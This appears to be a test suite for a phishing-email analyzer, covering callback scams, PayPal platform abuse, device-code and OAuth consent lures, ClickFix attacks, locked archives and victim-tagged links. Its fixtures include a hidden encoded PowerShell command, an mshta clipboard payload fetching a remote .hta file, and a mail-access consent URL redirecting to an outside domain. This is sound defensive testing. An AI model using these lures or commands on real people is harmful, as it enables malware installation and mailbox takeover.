import { analyzeRawEmail } from '../src/core/analyze';
import { callbackSigns, phoneNumbers } from '../src/analyzers/techniques';
import { makeZip } from './helpers';

const ids = async (raw: string) => (await analyzeRawEmail(raw)).findings.map((f) => f.id);
const mail = (headers: string[], body: string) => `${headers.join('\n')}\n\n${body}`;

describe('callback (TOAD) scams', () => {
  const geekSquad = 'Thank you for renewing your Geek Squad protection. Your account has been charged $399.99 for the annual subscription. If you did not authorize this transaction, call our billing department at +1 (808) 555-0142 to cancel and get a refund.';

  it('finds phone numbers, not order numbers or dates', () => {
    expect(phoneNumbers('Call 1-800-555-0199 or +44 20 7946 0958. Order 2026-10-19 #12345678.')).toEqual(['1-800-555-0199', '+44 20 7946 0958']);
  });

  it('recognises the shape of a callback scam', () => {
    expect(callbackSigns(geekSquad)).toEqual({ phones: ['+1 (808) 555-0142'], amount: '$399.99' });
    expect(callbackSigns('Questions about your order? Call us at 1-800-555-0199.')).toBeNull();
  });

  it('flags it high from an unverified sender, as a note from a verified brand', async () => {
    const scam = await analyzeRawEmail(mail(['From: Billing <invoices@quick-billing-desk.com>', 'Subject: Invoice INV-4421'], geekSquad));
    expect(scam.findings.find((f) => f.id === 'callback-phishing')?.severity).toBe('high');
    const amazon = await analyzeRawEmail(mail(['Authentication-Results: mx.google.com; dmarc=pass header.from=amazon.com', 'From: Amazon <auto-confirm@amazon.com>', 'Subject: Your order'], geekSquad));
    expect(amazon.findings.find((f) => f.id === 'callback-phishing')?.severity).toBe('low');
  });
});

describe('abused notification platforms', () => {
  const paypalInvoice = (body: string) =>
    mail(['Authentication-Results: mx.google.com; dkim=pass header.d=paypal.com; dmarc=pass header.from=paypal.com', 'From: "service@paypal.com" <service@paypal.com>', 'Subject: You have a new invoice'], body);

  it('flags a genuine PayPal invoice whose note is a callback scam', async () => {
    const r = await analyzeRawEmail(paypalInvoice('Seller note: Your PayPal account was charged $499.00 for Bitcoin purchase. If you did not authorize this, call PayPal support at +1 (888) 555-0187 to cancel and get a refund.'));
    const f = r.findings.find((x) => x.id === 'platform-abuse');
    expect(f?.severity).toBe('high');
    expect(f?.title).toBe("A real PayPal email carrying a scammer's message");
    expect(f?.detail).toMatch(/\+1 \(888\) 555-0187/);
    expect(r.findings.map((x) => x.id)).not.toContain('callback-phishing');
  });

  it('leaves an ordinary PayPal invoice alone', async () => {
    expect(await ids(paypalInvoice('Acme Ltd sent you an invoice for $25.00. View and pay it at https://www.paypal.com/invoice/p/#ABC'))).not.toContain('platform-abuse');
  });
});

describe('consent and device-code lures', () => {
  const html = (body: string) => mail(['From: IT <it@corp-helpdesk.co>', 'Subject: Action needed', 'Content-Type: text/html'], body);

  it('flags device-code phishing', async () => {
    const r = await analyzeRawEmail(html('<p>To keep access, go to <a href="https://microsoft.com/devicelogin">microsoft.com/devicelogin</a> and enter code: QXT7-K29PA</p>'));
    const f = r.findings.find((x) => x.id === 'device-code-lure');
    expect(f?.severity).toBe('high');
    expect(f?.detail).toContain('QXT7-K29PA');
  });

  it('flags a consent link asking for mail access or redirecting elsewhere', async () => {
    const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=14b2864e-3cff-4d33-b5cd-7f14ca272ea4&response_type=code&scope=offline_access%20Mail.Read&redirect_uri=https%3A%2F%2Fchikeukohandco.com%2Fsaas%2FIndex.html';
    const f = (await analyzeRawEmail(html(`<a href="${url}">Review document</a>`))).findings.find((x) => x.id === 'oauth-consent-link');
    expect(f).toMatchObject({ severity: 'high', title: 'Asks you to give an app access to your email or files' });
    expect(f?.detail).toContain('chikeukohandco.com');
  });

  it('ignores ordinary Microsoft links', async () => {
    const found = await ids(html('<a href="https://login.microsoftonline.com/">Sign in</a> <a href="https://www.microsoft.com/en-us/security">Security</a>'));
    expect(found.filter((id) => id === 'device-code-lure' || id === 'oauth-consent-link')).toEqual([]);
  });
});

describe('ClickFix', () => {
  it('flags paste-a-command instructions', async () => {
    const r = await analyzeRawEmail(mail(['From: a@b-verify.top', 'Subject: Verify you are human'], 'To finish verification: press Windows key + R, then Ctrl + V and Enter. This opens the Run dialog. powershell -w hidden -enc SQBFAFgA'));
    expect(r.findings.find((f) => f.id === 'clickfix')?.severity).toBe('critical');
  });

  it('flags an HTML attachment that copies a command to the clipboard', async () => {
    const page = '<button onclick="navigator.clipboard.writeText(\'mshta https://x.top/a.hta\')">I am not a robot</button>';
    const raw = [
      'From: a@b.top', 'Subject: Document', 'MIME-Version: 1.0', 'Content-Type: multipart/mixed; boundary="B"', '', '--B', 'Content-Type: text/plain', '', 'See attached.', '--B',
      'Content-Type: text/html; name="doc.html"', 'Content-Disposition: attachment; filename="doc.html"', 'Content-Transfer-Encoding: base64', '', Buffer.from(page).toString('base64'), '--B--',
    ].join('\r\n');
    expect(await ids(raw)).toContain('clickfix-attachment-doc.html');
  });

  it('ignores normal keyboard tips', async () => {
    expect(await ids(mail(['From: a@example.com', 'Subject: tips'], 'Tip: press Ctrl + V to paste text into the editor.'))).not.toContain('clickfix');
  });
});

describe('locked archive with the password in the email', () => {
  async function withZip(body: string) {
    const zip = await makeZip([{ name: 'invoice.js', data: new TextEncoder().encode('x') }]);
    zip[6] = zip[6]! | 1; // the "encrypted" bit
    return [
      'From: accounts@supplier-docs.top', 'Subject: Invoice', 'MIME-Version: 1.0', 'Content-Type: multipart/mixed; boundary="B"', '', '--B', 'Content-Type: text/plain', '', body, '--B',
      'Content-Type: application/zip; name="invoice.zip"', 'Content-Disposition: attachment; filename="invoice.zip"', 'Content-Transfer-Encoding: base64', '', Buffer.from(zip).toString('base64'), '--B--',
    ].join('\r\n');
  }

  it('flags it critical', async () => {
    const f = (await analyzeRawEmail(await withZip('Please find the invoice attached. Password: 4471'))).findings.find((x) => x.id === 'archive-password-in-body');
    expect(f).toMatchObject({ severity: 'critical', title: 'Locked archive with its password in the email ("4471")' });
  });

  it('needs the password to be in the email', async () => {
    expect(await ids(await withZip('Please find the invoice attached.'))).not.toContain('archive-password-in-body');
  });
});

describe('links that carry your email address', () => {
  const html = (href: string) => mail(['From: a@b.top', 'Subject: Document shared', 'Content-Type: text/html'], `<a href="${href}">Open</a>`);
  const flagsOf = async (href: string) => (await analyzeRawEmail(html(href))).links[0]!.flags.map((f) => f.id);

  it('flags an address after the # (plain or base64): a pre-filled phishing login', async () => {
    expect(await flagsOf('https://login-docs.pages.dev/#victim@example.org')).toContain('victim-email');
    expect(await flagsOf(`https://login-docs.pages.dev/#${btoa('victim@example.org')}`)).toContain('victim-email');
  });

  it('flags a base64 address in the path, not a plain unsubscribe link', async () => {
    expect(await flagsOf(`https://share-files.top/d/${btoa('victim@example.org')}`)).toContain('encoded-email');
    expect(await flagsOf('https://news.example.com/unsubscribe?email=victim@example.org')).not.toContain('encoded-email');
  });
});
